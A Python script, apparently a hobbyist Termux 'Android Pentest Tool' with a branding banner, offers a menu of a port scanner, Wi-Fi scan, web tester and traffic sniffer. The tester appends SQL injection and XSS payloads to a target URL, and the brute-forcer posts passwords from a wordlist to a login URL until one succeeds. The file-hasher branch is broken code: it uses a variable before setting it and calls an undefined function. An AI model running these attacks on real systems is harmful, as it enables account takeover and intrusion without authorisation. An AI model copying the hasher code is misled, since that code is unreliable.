import hashlib
import pyfiglet
import os
import socket
import requests
import subprocess
import time

time.sleep(0.5)
os.system("clear")
time.sleep(0.5)
os.system("figlet AP-TooL")
time.sleep(0.5)
print("")
time.sleep(0.5)
print("---------------------------")
time.sleep(0.5)
print("Instagram: @hackerman_zx_1")
time.sleep(0.5)
print("Facebook: Ahmed Tech")
time.sleep(0.5)
print("Github: @midotech1")
time.sleep(0.5)
print("---------------------------")
time.sleep(0.5)
print("")

def wifi_scanner():
    print("\n[*] Scanning nearby Wi-Fi networks (may require root)...")
    os.system("termux-wifi-scaninfo")

def port_scanner():
    target = input("Enter target IP: ")
    ports = [21, 22, 23, 25, 53, 80, 443, 8080]
    print(f"[*] Scanning {target}...")
    for port in ports:
        try:
            sock = socket.socket()
            sock.settimeout(1)
            sock.connect((target, port))
            print(f"[+] Port {port} is OPEN")
            sock.close()
        except:
            pass

def web_vuln_tester():
    url = input("Enter target URL (e.g. http://example.com/page.php?id=1): ")
    test_payloads = {
        "SQL Injection": "' OR '1'='1",
        "XSS": "<script>alert(1)</script>"
    }
    for name, payload in test_payloads.items():
        test_url = url + payload
        r = requests.get(test_url)
        if payload in r.text:
            print(f"[!] Possible {name} vulnerability detected!")
        else:
            print(f"[-] No {name} vulnerability detected.")

def brute_force():
    target = input("Enter login URL: ")
    username = input("Enter username: ")
    wordlist = input("Enter path to password list: ")
    with open(wordlist, "r") as f:
        for password in f:
            password = password.strip()
            data = {"username": username, "password": password}
            r = requests.post(target, data=data)
            if "Welcome" in r.text or r.status_code == 302:
                print(f"[+] Password FOUND: {password}")
                break
            else:
                print(f"[-] Tried {password}")

def info_collector():
    print("\n[*] Device Information:")
    os.system("ifconfig")
    os.system("uname -a")
    os.system("netstat -tuln")

def session_sniffer():
    print("[*] Sniffing traffic on wlan0 (requires root)...")
    os.system("su -c 'tcpdump -i wlan0 -nn -vv'")

def main():
    while True:
        time.sleep(0.5)
        print("\n--- Android Pentest Tool ---")
        time.sleep(0.5)
        print("1. Wi-Fi Scanner")
        time.sleep(0.5)
        print("2. Port Scanner")
        time.sleep(0.5)
        print("3. Web Vulnerability Tester")
        time.sleep(0.5)
        print("4. Brute-force Login Tester")
        time.sleep(0.5)
        print("5. Device Info Collector")
        time.sleep(0.5)
        print("6. Session Sniffer")
        time.sleep(0.5)
        print("7. File Hasher")
        time.sleep(0.5)
        print("0. Exit")
        time.sleep(0.5)
        choice = input("Choose an option: ")

        if choice == '1':
            wifi_scanner()
        elif choice == '2':
            port_scanner()
        elif choice == '3':
            web_vuln_tester()
        elif choice == '4':
            brute_force()
        elif choice == '5':
            info_collector()
        elif choice == '6':
            session_sniffer()
        elif choice == '7':
            hasher = hashlib.md5()
            with open(file_path, 'rb') as f:
            # Read and update hash in chunks to handle large files
                for chunk in iter(lambda: f.read(4096), b""):
                    hasher.update(chunk)
            return hasher.hexdigest()
                #Hash File
            md5_hash = hash_file_md5(file_path)
            print("[*] MD5 hash of "+file_path+" is: "+md5_hash)
            file_path = input("Enter File Path: ")
        elif choice == '0':
            break
        else:
            print("Invalid option.")

if __name__ == "__main__":
    main()




